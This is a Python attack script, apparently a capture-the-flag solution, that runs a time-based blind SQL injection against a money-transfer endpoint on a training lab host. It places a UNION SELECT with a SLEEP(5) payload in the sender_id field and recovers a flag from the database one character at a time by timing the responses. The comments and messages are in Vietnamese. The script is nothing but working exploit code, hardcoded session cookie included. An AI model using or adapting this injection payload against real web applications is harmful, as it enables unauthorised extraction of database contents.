import requests
import time 
CHARSET = ' abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.{}-' # 67 kí tự 
FLAG = ''
burp0_url = "https://koinbase-26b2120a7505ad.cyberjutsu-lab.tech:443/api/transaction.php?action=transfer_money"
burp0_cookies = {"PHPSESSID": "e07f4ca0f4729759c23ed32100348f01"}
burp0_headers = {"Sec-Ch-Ua": "", "Sec-Ch-Ua-Platform": "\"\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded", "Accept": "*/*", "Origin": "https://koinbase-26b2120a7505ad.cyberjutsu-lab.tech", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://koinbase-26b2120a7505ad.cyberjutsu-lab.tech/send_money.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

for index in range(1,100):
    for c in CHARSET:
        burp0_data = {
            
            "sender_id": 
            f"1 UNION SELECT CASE when substring((SELECT flag FROM tonghop.flag),{index},1)= \"{c}\" then SLEEP(5) else NULL end, NULL, NULL, NULL, NULL, NULL #", "receiver_id": "1", "amount": "1"
                                        
        }
        r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        thoi_gian_phan_hoi = r.elapsed.total_seconds()
        print("Tui đang thử kí tự thứ ",index," nè: ", c, "-->", r.text, "(time:",thoi_gian_phan_hoi,")", end="\r")
        if thoi_gian_phan_hoi >= 5:
            FLAG += c
            print("Tìm ra kí tự thứ ", index, "là ", c, "(FLAG:",FLAG,")")
            break
